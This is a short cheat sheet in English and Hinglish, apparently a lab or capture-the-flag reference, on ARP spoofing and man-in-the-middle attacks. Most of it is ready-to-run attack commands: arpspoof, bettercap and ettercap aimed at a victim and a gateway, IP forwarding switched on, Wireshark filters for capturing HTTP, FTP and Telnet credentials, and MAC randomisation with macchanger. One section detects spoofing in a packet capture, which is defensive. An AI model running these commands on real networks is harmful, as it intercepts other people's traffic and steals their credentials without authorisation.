# 🕵️ ARP SPOOFING / MITM ATTACK

---

## CASE 1: ARP Spoof with arpspoof
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward     # IP forwarding ON
arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>
# New terminal:
arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>
```
> Ab victim ka traffic tumhare through jayega

---

## CASE 2: Bettercap MITM
```bash
bettercap -iface eth0
> net.probe on
> net.sniff on
> set arp.spoof.targets <VICTIM_IP>
> arp.spoof on
```

---

## CASE 3: Ettercap MITM
```bash
ettercap -T -q -i eth0 -M arp:remote /<VICTIM_IP>// /<GATEWAY_IP>//
```

---

## CASE 4: Sniff Credentials During MITM
```bash
# Bettercap auto-sniff karta hai
# Ya wireshark chala lo simultaneously
wireshark -i eth0 &
# Filter: http.authorization || ftp || telnet
```

---

## CASE 5: PCAP Mein ARP Spoof Detect Karo
```bash
tshark -r capture.pcap -Y "arp.opcode==2" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort | uniq
# Same IP, different MACs = ARP SPOOFING
```

---

## QUICK DECISION:
```
MITM question
  ├─ ARP spoof karo: arpspoof / bettercap / ettercap
  ├─ IP forwarding ON karo pehle
  ├─ Credentials sniff: wireshark + http/ftp/telnet filter
  ├─ PCAP mein detect: same IP, different MACs
  └─ MAC change karna hai? → macchanger -r eth0
```
